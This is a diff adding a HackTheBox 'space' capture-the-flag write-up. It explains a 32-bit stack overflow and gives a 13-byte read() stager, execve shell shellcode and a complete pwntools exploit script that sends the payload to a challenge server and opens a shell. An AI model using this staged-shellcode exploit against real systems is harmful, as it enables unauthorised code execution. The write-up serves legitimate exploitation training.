@@ -1,0 +1,98 @@
+<!--Solve date: 01/08/2021-->
+
+<h1>HackTheBox - space</h1>
+
+<h2>Binary Exploitation - 30 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This challenge features a 32-bit program that reads 31 bytes of input and performs an insecure string copy to the stack of a local function <code>vuln()</code>. Specifically, there are 31 - 14 = 17 bytes of overflow beyond the vulnerable frame's <code>ebp</code>. Evidently, this is not much space. Multiple safeguards are disabled for this program, including position-independent execution (even though the binary uses thunks, which are typically found in PIEs) and non-executable stack, which means shellcode is a possible exploitation route.</p>
+
+<h5>Exploitation</h5>
+
+<p>Let's assess the different ways to get a shell. Probably the easiest from an organizational perspective is to return to a one-gadget, which requires a library address  (this leak will also reveal the version of glibc running on the server, which is not explicitly given). This exploit must be performed in at least two trials, since it is not possible to simultaneously leak and modify the payload in a single trial (even when disregarding the limitations due to a small buffer). Thus, we must somehow return to <code>main()</code> after leaking the address in the first run. During the final trial, we only need 8 bytes of overflow (4 for overwriting the saved <code>ebp</code> and the other 4 for the one-gadget target).</p>
+
+<p>Another technique is to proceed via shellcode. Shellcode can be run by taking advantage of the gadget shown in Figure 1 below, which loads the address of the Global Offset Table in <code>eax</code> and jumps to <code>esp</code>. It also provides 4 extra bytes of executable code from the "saved" base pointer in <code>vuln()</code>'s frame. Like the one-gadget approach, it is not possible to set up the <code>execve()</code> syscall in a single trial, as this requires loading the string <code>/bin/sh</code> into the memory and thereafter setting up pointers, which cannot (as far as I know) be done in a single run of 4 + 9 = 13 bytes (leaving the other 4 bytes for the address of the jump-to-stack gadget).</p>
+
+<img class = "small" src = "./images/htb_space_1.png"/>
+
+<p class = "caption">Figure 1. Jump-to-stack gadget that can be used to branch to shellcode (the binary has NX disabled).</p>
+
+<p>While both of these techniques might work with cleverly optimized payloads that I am personally incapable of dreaming up, in situations where space is limited, it might help to consider how to create that needed space. In this case, we have an executable and writabale stack, which offers plenty of room to <code>read()</code> in a separate shellcode, then transfer execution there.</p>
+
+<p>Recall that there are only 13 bytes we can use to set up a syscall to <code>read()</code> and then jump. In the first half of the shellcode, we load <code>ecx</code> with <code>esp</code>, and we set <code>eax</code> to the syscall number for <code>read</code>. We also clear <code>ebx</code> so that we read from <code>stdin</code>. The number of bytes to read is arbitrary - in reality we only need about 30 bytes. Let's do 255, an easily-produced register value.</p>
+
+<pre class = "asm">
+mov ecx, esp        ; in "saved" ebp
+push 3              ; in "saved" ebp
+pop eax
+xor ebx, ebx
+xor edx, edx
+dec dl
+int 0x80
+</pre>
+
+<p>which compiles to 13 total bytes (the exact amount!). The "saved" <code>ebx</code> value will be set to 3, which is the syscall number for <code>read</code>; note that <code>ebx</code> is then set to 0 by the shellcode to set the file handle to <code>stdin</code>. The "saved" <code>ebp</code> will house the first two instructions in the small shellcode, since it is <code>push</code>ed by the gadget to just before the rest of the code.</p>
+
+<p>At this point, the stack has been completely perverted as an rwx segment, and <code>esp</code> is just acting like any other data pointer. Since we are <code>read()</code>ing to a "buffer" starting at <code>esp</code>, we need to write over the original shellcode and start the actual shellcode at offset +13 so that when we return from the system call, we continue with executing the freshly-read shellcode. Below is a visualization of the "stack" during this process:</p>
+
+<img class = "small" src = "./images/htb_space_2.png"/>
+
+<p class = "caption">Figure 2. Layout of the stack and location of stack pointer during execution of the small shellcode and at the beginning of the actual shellcode.</p>
+
+<p>At this point, we can just use any old 32-bit <code>execve</code> shellcode pre-padded with 13 <code>nop</code> instructions and then we should be good to go. Let's use the <a href = "http://shell-storm.org/shellcode/files/shellcode-811.php" target = "_blank">excellent one provided by Mr. Pereira on Shell-Storm</a>, which also gives a clean exit:</p>
+
+<pre class = "asm">
+nop .rep 13
+xor eax, eax
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov ecx, eax
+mov edx, eax
+mov al, 0xb
+int 0x80        ;execve("/bin/sh", NULL, NULL);
+xor eax, eax
+inc eax
+int 0x80        ;exit(??);
+</pre>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+
+if ready:
+    p = remote("206.189.118.190", 31168)
+    p.recvuntil("> ")
+
+jmp_stack = 0x08049192
+short_shellcode1 = b"\x89\xe1\x6a\x03"
+short_shellcode2 = b"\x58\x31\xdb\x31\xd2\xfe\xca\xcd\x80"
+actual_shellcode = 13 * b'\x90' + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+payload = 10 * b'\x01' + p32(0xdeadbeef) + short_shellcode1 + p32(jmp_stack) + short_shellcode2
+payload += (31 - len(payload)) * b'\x00'
+
+if not ready:
+    with open("./test", "wb") as f:
+        f.write(payload)
+        f.write(actual_shellcode)
+
+else:
+    p.send(payload)
+    p.send(actual_shellcode)
+    p.interactive()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>176ad88cf974f78fdc9b40e66a02cbcba01139e14aa7f63531b7d16b71b7a300</code></p>
